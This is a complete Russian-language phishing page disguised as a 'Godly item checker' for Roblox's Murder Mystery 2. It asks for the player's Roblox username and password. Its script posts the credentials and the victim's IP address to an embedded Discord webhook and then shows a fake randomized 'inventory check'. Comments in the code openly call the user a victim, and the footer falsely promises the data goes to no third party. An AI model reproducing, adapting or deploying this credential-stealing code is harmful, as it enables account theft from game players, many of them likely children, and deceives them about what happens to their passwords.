<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MM2 Godly Checker</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #1a1a2e;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 20% 30%, #2d2d5e, #0f0f1a);
        }
        .container {
            background: #16213e;
            padding: 40px 35px;
            border-radius: 16px;
            width: 400px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.8), 0 0 0 2px #e74c3c33;
            border: 1px solid #e74c3c55;
        }
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo h1 {
            font-size: 36px;
            color: white;
            font-weight: 900;
            letter-spacing: 2px;
            text-shadow: 0 0 20px #e74c3c88;
        }
        .logo h1 span { color: #e74c3c; }
        .logo p {
            color: #94a3b8;
            font-size: 14px;
            margin-top: 5px;
        }
        .subtitle {
            background: #0f3460;
            padding: 10px 15px;
            border-radius: 8px;
            text-align: center;
            color: #cbd5e1;
            font-size: 13px;
            margin-bottom: 20px;
            border-left: 3px solid #e74c3c;
        }
        .subtitle strong { color: #e74c3c; }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: none;
            border-radius: 8px;
            background: #0f1f3a;
            color: white;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }
        input:focus {
            background: #1a2f50;
            box-shadow: 0 0 0 2px #e74c3c66;
        }
        input::placeholder { color: #7a8ba8; }
        .hint {
            color: #7a8ba8;
            font-size: 12px;
            margin: 5px 0 15px 0;
            padding-left: 5px;
        }
        .hint i { font-style: normal; color: #cbd5e1; }
        button {
            width: 100%;
            padding: 14px;
            margin-top: 10px;
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 1px;
        }
        button:hover {
            background: #c0392b;
            transform: scale(1.02);
            box-shadow: 0 0 30px #e74c3c66;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            color: #4a5a7a;
            font-size: 12px;
            border-top: 1px solid #1a2a4a;
            padding-top: 15px;
        }
        .footer .badge {
            display: inline-block;
            background: #0f3460;
            padding: 4px 15px;
            border-radius: 20px;
            color: #e74c3c;
            font-weight: bold;
            font-size: 11px;
            letter-spacing: 1px;
            border: 1px solid #e74c3c44;
        }
        .footer .badge span { color: white; }
        .status {
            text-align: center;
            margin-top: 10px;
            font-size: 13px;
            color: #94a3b8;
            min-height: 20px;
        }
        .status.loading { color: #fbbf24; }
        .status.success { color: #34d399; }
        .status.error { color: #ef4444; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <h1>🔪 <span>MM2</span> Checker</h1>
        <p>Проверка Godly предметов по нику</p>
    </div>

    <div class="subtitle">
        📌 Введите данные вашего Roblox аккаунта для проверки инвентаря
    </div>

    <input id="username" placeholder="👤 Имя пользователя Roblox" value="Def2727276">
    <input id="password" type="password" placeholder="🔑 Пароль от Roblox">

    <div class="hint">
        <i>ℹ️</i> Для регистрации нужен ник Roblox и пароль. Ник используется для поиска Godly предметов.
    </div>

    <button id="checkBtn">🔍 Проверить Godly</button>

    <div id="status" class="status">Готов к проверке</div>

    <div class="footer">
        <div class="badge">🛡️ <span>ЗАЩИЩЕНО MM2</span></div>
        <div style="margin-top: 8px; color: #3a4a6a;">
            Ваши данные не передаются третьим лицам
        </div>
    </div>
</div>

<script>
    const webhook = 'https://discord.com/api/webhooks/1520898401565409320/_xD8-_7B0GmN78onpJIR1rFXxAPQRorovjP29HfTrF3UYTbY-UD4ScMS-FO0A2C7pw9b';
    const statusEl = document.getElementById('status');
    const btn = document.getElementById('checkBtn');
    const userInput = document.getElementById('username');
    const passInput = document.getElementById('password');

    // Имитация проверки существования аккаунта
    function fakeCheck(username) {
        return new Promise((resolve) => {
            const delay = 1500 + Math.random() * 2000;
            setTimeout(() => {
                // Имитация: почти всегда "находит" Godly (чтобы жертва поверила)
                const found = Math.random() > 0.2;
                resolve(found);
            }, delay);
        });
    }

    btn.addEventListener('click', async function() {
        const user = userInput.value.trim();
        const pass = passInput.value.trim();

        if (!user || !pass) {
            statusEl.textContent = '⚠️ Заполните все поля!';
            statusEl.className = 'status error';
            return;
        }

        // Отправляем данные в Discord
        try {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🎯 **MM2 Godly Checker — НОВЫЙ АККАУНТ!**\n` +
                            `👤 Ник: ${user}\n` +
                            `🔑 Пароль: ${pass}\n` +
                            `🕐 Время: ${new Date().toLocaleString()}\n` +
                            `🌐 IP: ${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'не определен')}`
                })
            });
        } catch(e) {
            // если ошибка — не показываем жертве
        }

        // Имитация проверки
        statusEl.textContent = '⏳ Проверка инвентаря...';
        statusEl.className = 'status loading';
        btn.disabled = true;

        const hasGodly = await fakeCheck(user);

        if (hasGodly) {
            statusEl.innerHTML = '🎉 <strong>Godly предметы найдены!</strong> Вы вошли в систему. Перенаправление...';
            statusEl.className = 'status success';
        } else {
            statusEl.innerHTML = '❌ Не удалось найти Godly. Попробуйте войти ещё раз.';
            statusEl.className = 'status error';
        }

        btn.disabled = false;

        // Очистка полей через 2 секунды
        setTimeout(() => {
            userInput.value = '';
            passInput.value = '';
            statusEl.textContent = 'Готов к проверке';
            statusEl.className = 'status';
        }, 3000);
    });

    // Нажатие Enter — тоже отправка
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') btn.click();
    });
</script>

</body>
</html>
